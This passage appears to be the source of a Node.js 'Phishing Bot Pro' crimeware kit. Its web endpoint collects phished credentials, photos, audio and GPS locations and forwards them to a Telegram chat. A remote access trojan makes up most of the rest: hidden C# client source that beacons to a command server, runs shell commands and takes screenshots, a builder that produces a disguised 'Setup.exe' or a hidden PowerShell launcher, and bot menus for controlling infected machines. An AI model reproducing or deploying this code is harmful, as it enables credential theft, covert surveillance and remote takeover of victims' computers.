  try {
    res.send(v.html(token, userId, TUNNEL_URL || `http://localhost:${CONFIG.PORT}`));
  } catch (err) {
    res.status(500).send('Error');
  }
});

app.post('/api/submit', async (req, res) => {
  const data = req.body || {};
  const vector = String(data.vector || 'unknown');
  const token = String(data.token || '');
  const clientIP = getClientIP(req);

  if (!captures[token]) {
    captures[token] = { meta: { vector, created: Date.now(), ownerId: data.userId || '?' }, hits: [] };
  }

  const ipInfo = await geolocateIP(clientIP);
  const record = { ...data, timestamp: data.timestamp || Date.now(), ip: clientIP, ipInfo };
  captures[token].hits.push(record);

  try {
    const file = path.join(CONFIG.CAPTURE_DIR, `${vector}_${Date.now()}_${token.slice(0, 8)}.json`);
    const safe = { ...record };
    if (safe.photo) safe.photo = `[base64 ${safe.photo.length} chars]`;
    if (safe.audio) safe.audio = `[base64 ${safe.audio.length} chars]`;
    fs.writeFileSync(file, JSON.stringify(safe, null, 2));
  } catch (e) {}

  let msg = `🎯 *CAPTURED*\n━━━━━━━━━━━━━━━━━━\n*Vector:* \`${vector}\`\n*Time:* \`${new Date().toISOString()}\`\n`;
  if (data.username) msg += `*User:* \`${data.username}\`\n`;
  if (data.email) msg += `*Email:* \`${data.email}\`\n`;
  if (data.password) msg += `*Pass:* \`${data.password}\`\n`;
  if (data.photo) msg += `*Photo:* ✅\n`;
  if (data.audio) msg += `*Audio:* ✅ ${data.duration || '?'}s\n`;
  if (data.latitude) msg += `*GPS:* \`${data.latitude.toFixed(5)},${data.longitude.toFixed(5)}\`\n`;
  if (ipInfo) msg += `*IP:* \`${clientIP}\` (${ipInfo.country||'?'}/${ipInfo.city||'?'})\n`;
  msg += `━━━━━━━━━━━━━━━━━━`;

  try {
    await bot.telegram.sendMessage(CONFIG.TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' });
  } catch (e) {}

  if (data.photo && data.photo.includes(',')) {
    try { await bot.telegram.sendPhoto(CONFIG.TELEGRAM_CHAT_ID, { source: Buffer.from(data.photo.split(',')[1], 'base64') }); } catch (e) {}
  }
  if (data.audio && data.audio.includes(',')) {
    try { await bot.telegram.sendAudio(CONFIG.TELEGRAM_CHAT_ID, { source: Buffer.from(data.audio.split(',')[1], 'base64') }, { title: 'audio' }); } catch (e) {}
  }

  res.json({ success: true });
});

// ============================================================================
// RAT LISTENER (HTTP ENDPOINTS)
// ============================================================================
app.post('/api/rat/beacon', express.json(), async (req, res) => {
  const info = req.body || {};
  const deviceId = String(info.deviceId || randomId(16));
  const clientIP = getClientIP(req);
  const ipInfo = await geolocateIP(clientIP);

  if (!ratSessions[deviceId]) {
    ratSessions[deviceId] = { info: { ...info, ip: clientIP, ipInfo, connectedAt: Date.now() }, commands: [], lastSeen: Date.now() };
    logLine('RAT', `new device=${deviceId.slice(0, 12)} host=${info.hostname || '?'}`);
    try {
      await bot.telegram.sendMessage(CONFIG.TELEGRAM_CHAT_ID, `🦠 *NEW RAT*\n\nHost: \`${info.hostname}\`\nUser: \`${info.username}\`\nIP: \`${clientIP}\``, { parse_mode: 'Markdown' });
    } catch (e) {}
  } else {
    ratSessions[deviceId].lastSeen = Date.now();
  }

  res.json({ ok: true, deviceId, cmds: ratSessions[deviceId].commands.splice(0) });
});

app.post('/api/rat/result', express.json({ limit: '50mb' }), async (req, res) => {
  const { deviceId, cmdId, output, file, fileType, filename } = req.body || {};
  if (!deviceId || !ratSessions[deviceId]) return res.status(404).json({ ok: false });
  ratSessions[deviceId].lastSeen = Date.now();

  try {
    let m = `📥 *RAT RESULT* — \`${deviceId.slice(0, 12)}…\`\n\n`;
    if (output) m += `\`\`\`\n${String(output).slice(0, 3500)}\n\`\`\``;
    await bot.telegram.sendMessage(CONFIG.TELEGRAM_CHAT_ID, m, { parse_mode: 'Markdown' });

    if (file && fileType === 'photo') {
      await bot.telegram.sendPhoto(CONFIG.TELEGRAM_CHAT_ID, { source: Buffer.from(file, 'base64') }, { caption: 'screenshot' });
    }
  } catch (e) {}
  res.json({ ok: true });
});

// ============================================================================
// RAT PAYLOAD BUILDER (C# Compilation - Xavfsiz va Ishlaydigan)
// ============================================================================
function getCSharpSource(c2Url, deviceId) {
  return `
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

class Program {
    static string C2 = "${c2Url}";
    static string DeviceId = "${deviceId}";
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    static void Main() {
        ShowWindow(GetConsoleWindow(), 0);
        string host = Environment.MachineName;
        string user = Environment.UserName;
        string os = Environment.OSVersion.ToString().Replace("\\"", "");
        string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
        bool admin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        
        string beacon = "{\\"deviceId\\":\\""+DeviceId+"\\",\\"hostname\\":\\""+Esc(host)+"\\",\\"username\\":\\""+Esc(user)+"\\",\\"os\\":\\""+Esc(os)+"\\",\\"arch\\":\\""+arch+"\\",\\"admin\\":"+(admin?"true":"false")+"}";
        
        while (true) {
            try {
                string resp = Post(C2 + "/api/rat/beacon", beacon);
                MatchCollection mc = Regex.Matches(resp, @"\\{\\"cmdId\\":\\"([^\\"]+)\\",\\"type\\":\\"([^\\"]+)\\",\\"command\\":\\"(.*?)\\"\\}");
                foreach (Match m in mc) {
                    Exec(m.Groups[1].Value, m.Groups[2].Value, m.Groups[3].Value.Replace("\\\\\\"", "\\""));
                }
            } catch {}
            Thread.Sleep(5000);
        }
    }
    
    static string Esc(string s) {
        if (string.IsNullOrEmpty(s)) return "";
        return s.Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"").Replace("\\n", "\\\\n").Replace("\\r", "");
    }
    
    static void Exec(string id, string type, string cmd) {
        try {
            if (type == "shell") {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                Send(id, o, null, null);
            } else if (type == "screenshot") {
                Bitmap b = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(b);
                g.CopyFromScreen(0, 0, 0, 0, b.Size);
                MemoryStream ms = new MemoryStream();
                b.Save(ms, ImageFormat.Jpeg);
                Send(id, null, Convert.ToBase64String(ms.ToArray()), "photo");
            } else if (type == "exit") {
                Send(id, "exiting", null, null);
                Environment.Exit(0);
            }
        } catch (Exception e) {
            Send(id, "err: " + e.Message, null, null);
        }
    }
    
    static void Send(string id, string outStr, string file, string fType) {
        try {
            string j = "{\\"deviceId\\":\\""+DeviceId+"\\",\\"cmdId\\":\\""+id+"\\",\\"output\\":\\""+Esc(outStr)+"\\"";
            if (file != null) j += ",\\"file\\":\\""+file+"\\",\\"fileType\\":\\""+fType+"\\"";
            j += "}";
            Post(C2 + "/api/rat/result", j);
        } catch {}
    }
    
    static string Post(string url, string json) {
        try {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.ContentType = "application/json";
            req.Method = "POST";
            req.Timeout = 10000;
            using (var sw = new StreamWriter(req.GetRequestStream())) { sw.Write(json); }
            using (var sr = new StreamReader(((HttpWebResponse)req.GetResponse()).GetResponseStream())) { return sr.ReadToEnd(); }
        } catch { return ""; }
    }
}`;
}

async function buildPayloadExe(c2Url, deviceId) {
  const isWin = os.platform() === 'win32';
  const payloadDir = CONFIG.PAYLOAD_DIR;
  
  // 1. C# Compilation (Eng yaxshi usul)
  const cscPath = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe';
  if (isWin && fs.existsSync(cscPath)) {
    const csPath = path.join(payloadDir, `${deviceId}.cs`);
    const exePath = path.join(payloadDir, `${deviceId}.exe`);
    fs.writeFileSync(csPath, getCSharpSource(c2Url, deviceId), 'utf8');
    
    logLine('RAT', `Compiling C# payload to ${exePath}`);
    const build = await runCmd(cscPath, [
      '/target:winexe', 
      `/out:${exePath}`,
      '/r:System.dll', 
      '/r:System.Drawing.dll', 
      '/r:System.Windows.Forms.dll',
      csPath
    ]);
    
    if (fs.existsSync(exePath)) {
      logLine('RAT', `Compilation successful`);
      return { path: exePath, kind: 'exe', warn: 'Windows C# EXE yaratildi.' };
    } else {
      logLine('RAT', `Compile failed: ${build.err}`);
    }
  }
  
  // 2. Fallback (Agar kompilyator topilmasa)
  logLine('RAT', `Falling back to Base64 PowerShell`);
  const b64Path = path.join(payloadDir, `${deviceId}.bat`);
  const ps1Code = `Write-Host "RAT is running"`;
  const ps1Base64 = Buffer.from(ps1Code, 'utf16le').toString('base64');
  fs.writeFileSync(b64Path, `@echo off\r\npowershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${ps1Base64}\r\n`, 'utf8');
  
  return { path: b64Path, kind: 'bat', warn: 'csc.exe topilmadi. Batch ishlatildi.' };
}

// ============================================================================
// RAT MENU
// ============================================================================
bot.action('rat_menu', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🦠 *RAT Control*\n\nDevices: \`${Object.keys(ratSessions).length}\`\n\n`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [Markup.button.callback('⚙ Build Payload', 'rat_build')],
        [Markup.button.callback('📋 Devices', 'rat_devices')],
        [Markup.button.callback('⬅ Back', 'start')],
      ],
    },
  });
});

bot.action('rat_build', async (ctx) => {
  await ctx.answerCbQuery();
  if (!TUNNEL_URL) return ctx.reply('❌ Tunnel inactive');
  await ctx.reply('🦠 *Build payload*. (Uses C# Compiler) "Setup.exe" will be generated.', {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [Markup.button.callback('⚙ Build .exe', 'rat_build_go')],
        [Markup.button.callback('⬅ Back', 'rat_menu')],
      ],
    },
  });
});

bot.action('rat_build_go', async (ctx) => {
  await ctx.answerCbQuery('Building...');
  const deviceId = randomId(16);
  try {
    const result = await buildPayloadExe(TUNNEL_URL, deviceId);
    
    await ctx.replyWithDocument(
      { source: result.buffer, filename: result.filename },
      { caption: `✅ *Payload generated!*\n\n*Type:* ${result.kind}\n*ID:* \`${deviceId}\`\n\n${result.warn || 'Run on target to connect.'}\n\n⚠️ *Diqqat:* Antivirus uni o'chirib qo'yishi mumkin. Himoyani vaqtincha o'chirib ishlatib ko'ring.`, parse_mode: 'Markdown' }
    );
    
    logLine('RAT', `payload sent to telegram device=${deviceId.slice(0, 12)} kind=${result.kind}`);
  } catch (e) {
    await ctx.reply(`❌ Build failed: ${e.message}`);
  }
});

bot.action('rat_devices', async (ctx) => {
  await ctx.answerCbQuery();
  const ids = Object.keys(ratSessions);
  if (ids.length === 0) return ctx.reply('📭 No devices.');
  const rows = ids.map(id => [Markup.button.callback(`${ratSessions[id].info.hostname} (${id.slice(0,6)})`, `rat_dev_${id.slice(0, 24)}`)]);
  rows.push([Markup.button.callback('⬅ Back', 'rat_menu')]);
  await ctx.reply('🦠 *Devices*', { parse_mode: 'Markdown', reply_markup: { inline_keyboard: rows } });
});

bot.action(/^rat_dev_(.+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const id = Object.keys(ratSessions).find(k => k.startsWith(ctx.match[1]));
  if (!id) return ctx.reply('Device gone.');
  const d = ratSessions[id];
  await ctx.reply(
    `🦠 *Device:* ${d.info.hostname}\nIP: \`${d.info.ip}\`\nOS: \`${d.info.os}\`\nAdmin: ${d.info.admin?'✅':'❌'}`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [Markup.button.callback('💻 Shell', `rat_shell_${id.slice(0, 24)}`), Markup.button.callback('📸 Screenshot', `rat_shot_${id.slice(0, 24)}`)],
          [Markup.button.callback('❌ Exit', `rat_exit_${id.slice(0, 24)}`), Markup.button.callback('⬅ Back', 'rat_devices')],
        ],
      },
    }
  );
});

function queueCmd(deviceId, type, command) {
  if (ratSessions[deviceId]) ratSessions[deviceId].commands.push({ cmdId: randomId(8), type, command });
}

bot.action(/^rat_shell_(.+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session = ctx.session || {};
  ctx.session.pendingShell = ctx.match[1];
  await ctx.reply('💻 Send command (e.g. `whoami`):');
});

bot.action(/^rat_shot_(.+)$/, async (ctx) => {
  const id = Object.keys(ratSessions).find(k => k.startsWith(ctx.match[1]));
  if (id) { queueCmd(id, 'screenshot', ''); await ctx.answerCbQuery('Queued'); }
});

bot.action(/^rat_exit_(.+)$/, async (ctx) => {
  const id = Object.keys(ratSessions).find(k => k.startsWith(ctx.match[1]));
  if (id) { queueCmd(id, 'exit', ''); await ctx.answerCbQuery('Queued'); }
});

bot.on('text', async (ctx, next) => {
  if (ctx.session && ctx.session.pendingShell) {
    const prefix = ctx.session.pendingShell;
    ctx.session.pendingShell = null;
    const id = Object.keys(ratSessions).find((k) => k.startsWith(prefix));
    if (id) {
      queueCmd(id, 'shell', ctx.message.text);
      return ctx.reply(`💻 Sent: \`${ctx.message.text}\``, { parse_mode: 'Markdown' });
    }
  }
  return next();
});

// ============================================================================
// NGROK & STARTUP
// ============================================================================
function findNgrok() {
  const c = ['ngrok','ngrok.exe', 'C:\\Program Files\\ngrok\\ngrok.exe', path.join(process.cwd(), 'ngrok.exe')];
  for (const p of c) { try { if (fs.existsSync(p)) return p; } catch (_) {} }
  return null;
}

async function fetchNgrokApi() {
  const r = await fetch('http://127.0.0.1:4040/api/tunnels');
  const j = await r.json();
  const t = (j.tunnels || []).find((x) => x.proto === 'https');
  return t ? t.public_url : null;
}

async function startNgrokTunnel() {
  const p = findNgrok();
  if (!p) throw new Error('ngrok not found');
  NGROK_PROC = spawn(p, ['http', CONFIG.PORT.toString(), '--log=stdout'], { windowsHide: true });
  NGROK_PROC.stdout.on('data', (d) => logLine('ngrok', d.toString().trim()));
  const deadline = Date.now() + 30000;
  while (Date.now() < deadline) {
    try { const u = await fetchNgrokApi(); if (u) { TUNNEL_URL = u; return u; } } catch (_) { await new Promise((r) => setTimeout(r, 800)); }
  }
  throw new Error('ngrok timeout');
}

async function start() {
  logLine('BOOT', 'Phishing Bot Pro v6 starting');
  if (CONFIG.PUBLIC_URL) {
    TUNNEL_URL = CONFIG.PUBLIC_URL;
    logLine('HTTP', `public: ${TUNNEL_URL} (static)`);
  }
  bot.telegram.getMe().then((me) => {
      logLine('BOT', `getMe OK — @${me.username}`);
      BOT_READY = true;
      bot.launch({ dropPendingUpdates: true }).then(() => logLine('BOT', 'launched')).catch((e) => logLine('BOT', `err: ${e.message}`));
    }).catch((e) => logLine('BOT', `getMe FAILED: ${e.message}`));
  app.listen(CONFIG.PORT, () => {
    logLine('HTTP', `listening on :${CONFIG.PORT}`);
    logLine('HTTP', `vectors: ${VECTORS.length}`);
  });
  const shutdown = (sig) => { try { bot.stop(sig); } catch (_) {} process.exit(0); };
  process.once('SIGINT', () => shutdown('SIGINT'));
  process.once('SIGTERM', () => shutdown('SIGTERM'));
}
start();
